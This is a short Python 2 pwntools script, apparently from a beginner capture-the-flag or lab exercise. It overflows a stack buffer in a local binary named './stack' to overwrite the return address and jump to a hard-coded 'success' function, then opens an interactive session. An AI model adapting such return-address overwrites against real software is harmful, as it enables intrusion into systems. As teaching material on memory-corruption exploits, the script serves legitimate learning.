##coding=utf8
from pwn import *
sh = process('./stack')
success_addr = 0x0804843B
payload = 'a'*0x14+'bbbb'+p32(success_addr)
print p32(success_addr)
sh.sendline(payload)
sh.interactive()
